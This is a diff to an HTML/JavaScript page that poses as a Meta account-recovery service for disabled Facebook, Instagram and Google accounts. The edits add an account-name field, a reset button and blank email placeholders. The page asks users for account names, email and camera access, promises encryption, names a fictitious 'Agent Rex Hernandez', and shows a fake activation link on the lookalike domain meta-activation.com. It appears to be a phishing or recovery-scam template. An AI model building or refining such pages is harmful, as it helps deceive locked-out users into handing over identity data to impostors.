@@ -42,6 +42,8 @@ button{padding:12px;border:none;border-radius:6px;font-size:15px;font-weight:600
 .btn-back:hover{background:#4a4b4d;}
 .btn-next{background:#0081FB;color:#ffffff;flex:1;}
 .btn-next:hover{background:#006edb;}
+.btn-reset{background:#4e4f50;color:#ffffff;width:100%;margin-top:20px;}
+.btn-reset:hover{background:#5e5f60;}
 .review-box{background:#3a3b3c;border-radius:6px;padding:15px;margin-bottom:20px;}
 .review-box p{color:#b0b3b8;font-size:12px;margin-bottom:4px;}
 .review-box span{color:#ffffff;font-size:14px;}
@@ -89,6 +91,8 @@ button{padding:12px;border:none;border-radius:6px;font-size:15px;font-weight:600
         <button class="platform-btn ig" data-p="ig"><i class="fab fa-instagram"></i> Instagram</button>
         <button class="platform-btn gg" data-p="gg"><i class="fab fa-google"></i> Google</button>
       </div>
+      <label>ACCOUNT USERNAME / NAME</label>
+      <input type="text" id="accountName" placeholder="Enter your disabled account name or username">
       <label>SELECT REASON</label>
       <select id="reason">
         <option>Temporarily Disabled Account</option>
@@ -99,7 +103,7 @@ button{padding:12px;border:none;border-radius:6px;font-size:15px;font-weight:600
       <label>ADDITIONAL DETAILS</label>
       <textarea id="details" placeholder="Type here..."></textarea>
       <div class="notice"><i class="fas fa-shield-alt"></i><span>All information is encrypted and secure.</span></div>
-      <button class="btn-next" id="btn1to2">Next <i class="fas fa-chevron-right"></i></button>
+      <button class="btn-next" id="btn1to2" style="width:100%;">Next <i class="fas fa-chevron-right"></i></button>
     </div>
 
     <!-- PAGE 2 -->
@@ -107,6 +111,7 @@ button{padding:12px;border:none;border-radius:6px;font-size:15px;font-weight:600
       <label>REVIEW YOUR INFORMATION</label>
       <div class="review-box">
         <p>Platform</p><span id="r-platform">Facebook</span>
+        <p style="margin-top:15px;">Account Name / Username</p><span id="r-account">-</span>
         <p style="margin-top:15px;">Reason</p><span id="r-reason">Permanently Disabled Account</span>
         <p style="margin-top:15px;">Details</p><span id="r-details">-</span>
       </div>
@@ -120,9 +125,9 @@ button{padding:12px;border:none;border-radius:6px;font-size:15px;font-weight:600
     <!-- PAGE 3 -->
     <div class="page" id="page3">
       <label>YOUR EMAIL</label>
-      <input type="email" id="email1" value="rex.hernandez@gmail.com">
+      <input type="email" id="email1" placeholder="Enter your email address">
       <label>CONFIRM EMAIL</label>
-      <input type="email" id="email2" value="rex.hernandez@gmail.com">
+      <input type="email" id="email2" placeholder="Re-enter your email address">
       <div class="notice"><i class="fas fa-envelope"></i><span>We will send the link to this email.</span></div>
       <div class="btn-row">
         <button class="btn-back" id="btn3to2"><i class="fas fa-chevron-left"></i> Back</button>
@@ -149,8 +154,8 @@ button{padding:12px;border:none;border-radius:6px;font-size:15px;font-weight:600
     <div class="page" id="page5">
       <div style="text-align:center;padding:20px;">
         <div class="loading-icon"><i class="fas fa-spinner"></i></div>
-        <h3 class="loading-text">Agent Rex Hernandez</h3>
-        <p class="loading-text">Processing your account...</p>
+        <h3 class="loading-text">Processing Request</h3>
+        <p class="loading-text">Agent Rex Hernandez is processing your account...</p>
         <p class="time-text">Estimated review time: 1 hour</p>
       </div>
     </div>
@@ -159,14 +164,17 @@ button{padding:12px;border:none;border-radius:6px;font-size:15px;font-weight:600
     <div class="page" id="page6">
       <div style="text-align:center;padding:20px;">
         <div class="success-icon"><i class="fas fa-check-circle"></i></div>
-        <h3 class="success-text">Request Submitted</h3>
+        <h3 class="success-text">Request Submitted Successfully!</h3>
         <p class="sub-text">Check your email within 1 hour</p>
         <div class="email-info">
           <p>Confirmation sent to:</p>
-          <span id="final-email">rex.hernandez@gmail.com</span>
+          <span id="final-email">-</span>
+          <p style="margin-top:15px;">Account Name:</p>
+          <span id="final-account">-</span>
           <p style="margin-top:15px;">Activation Link:</p>
           <div class="link-box">https://meta-activation.com/verify?code=8XJ-29K-P7Z</div>
         </div>
+        <button class="btn-reset" id="btnReset"><i class="fas fa-home"></i> Submit Another Request</button>
       </div>
     </div>
   </div>
@@ -188,11 +196,13 @@ function updateReview(){
   if(document.querySelector('.platform-btn.ig.selected')) p = "Instagram";
   if(document.querySelector('.platform-btn.gg.selected')) p = "Google";
   document.getElementById('r-platform').textContent = p;
+  document.getElementById('r-account').textContent = document.getElementById('accountName').value || "-";
   document.getElementById('r-reason').textContent = document.getElementById('reason').value;
   document.getElementById('r-details').textContent = document.getElementById('details').value || "-";
 }
 document.getElementById('reason').addEventListener('change', updateReview);
 document.getElementById('details').addEventListener('input', updateReview);
+document.getElementById('accountName').addEventListener('input', updateReview);
 
 function setStep(n){
   for(let i=1;i<=4;i++){
@@ -206,6 +216,35 @@ function setStep(n){
 function showPage(id){
   document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
   document.getElementById(id).classList.add('active');
+}
+
+// RESET FUNCTION — Balik sa simula
+function resetForm(){
+  // Stop camera kung bukas pa
+  if(stream){
+    stream.getTracks().forEach(track => track.stop());
+    stream = null;
+  }
+  // Reset form fields
+  document.getElementById('accountName').value = '';
+  document.getElementById('reason').selectedIndex = 1;
+  document.getElementById('details').value = '';
+  document.getElementById('email1').value = '';
+  document.getElementById('email2').value = '';
+  // Reset platform selection
+  document.querySelectorAll('.platform-btn').forEach(x => x.classList.remove('selected'));
+  document.querySelector('.platform-btn.fb').classList.add('selected');
+  // Reset camera
+  const video = document.getElementById('cam');
+  video.srcObject = null;
+  video.style.display = 'none';
+  document.getElementById('cam-icon').style.display = 'block';
+  document.getElementById('cam-status').textContent = 'Click Start Camera';
+  document.getElementById('cam-btn').style.display = 'block';
+  // Balik sa page 1
+  showPage('page1');
+  setStep(1);
+  updateReview();
 }
 
 document.getElementById('btn1to2').addEventListener('click', function(){
@@ -235,7 +274,8 @@ document.getElementById('btn3to4').addEventListener('click', function(){
 });
 
 document.getElementById('btn4to5').addEventListener('click', function(){
-  document.getElementById('final-email').textContent = document.getElementById('email1').value;
+  document.getElementById('final-email').textContent = document.getElementById('email1').value || "No email provided";
+  document.getElementById('final-account').textContent = document.getElementById('accountName').value || "Not specified";
   showPage('page5');
   setTimeout(function(){
     showPage('page6');
@@ -255,6 +295,9 @@ document.getElementById('cam-btn').addEventListener('click', async function(){
     document.getElementById('cam-status').textContent = 'Camera access denied — Continue anyway';
   }
 });
+
+// Reset button — balik simula
+document.getElementById('btnReset').addEventListener('click', resetForm);
 </script>
 
 </body>
